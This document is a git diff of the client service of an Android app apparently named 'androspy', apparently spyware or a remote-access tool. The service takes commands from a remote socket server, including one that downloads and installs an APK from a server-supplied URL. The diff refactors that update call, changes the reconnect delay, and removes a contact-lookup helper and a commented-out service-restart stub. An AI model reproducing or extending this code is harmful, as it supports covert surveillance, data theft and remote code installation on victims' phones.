@@ -2,24 +2,15 @@ package buddy.ap.com.androspy;
 
 import android.Manifest;
 import android.app.Service;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
-import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
-import android.net.Uri;
-import android.os.Build;
 import android.os.Bundle;
 import android.os.IBinder;
-import android.provider.ContactsContract;
-import android.provider.Settings;
 import android.support.v4.app.ActivityCompat;
-import android.support.v4.content.ContextCompat;
-import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import org.json.JSONArray;
@@ -28,7 +19,6 @@ import org.json.JSONObject;
 
 import java.net.URISyntaxException;
 import java.util.HashMap;
-import java.util.concurrent.RunnableFuture;
 
 import http.Http;
 import io.socket.client.Ack;
@@ -164,9 +154,9 @@ public class Client extends Service {
                                 Log.i(TAG, "\nInvoking UpdateApp\n");
                                 String apkUrl = cmd.get("arg1").toString();
 
-                                UpdateApp atualizaApp = new UpdateApp();
-                                atualizaApp.setClient(client);
-                                atualizaApp.execute(apkUrl);
+                                UpdateApp atualizaApp = new UpdateApp(apkUrl);
+                                atualizaApp.setContext(client);
+                                atualizaApp.run();
                             }
 
                         } catch (JSONException e) {
@@ -188,7 +178,7 @@ public class Client extends Service {
                         public void run() {
                             Log.i(TAG, "Socket reconnecting...");
                             try {
-                                Thread.sleep(3000);
+                                Thread.sleep(5000);
                             } catch (InterruptedException e) {
                                 e.printStackTrace();
                             }
@@ -251,35 +241,4 @@ public class Client extends Service {
         }
     }
 
-    public String getContactName(Context context, String phoneNumber) {
-        // check permission
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
-            ContentResolver cr = context.getContentResolver();
-            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
-            Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
-            if (cursor == null) {
-                return null;
-            }
-            String contactName = null;
-            if (cursor.moveToFirst()) {
-                contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
-            }
-
-            if (cursor != null && !cursor.isClosed()) {
-                cursor.close();
-            }
-
-            return contactName;
-        } else {
-            return "";
-        }
-    }
-
-    @Override
-    public void onDestroy() {
-//        Intent in = new Intent();
-//        in.setAction("RestartAdoBotService");
-//        super.onDestroy();
-        Log.i(TAG, "Service was destroyed!!!");
-    }
 }
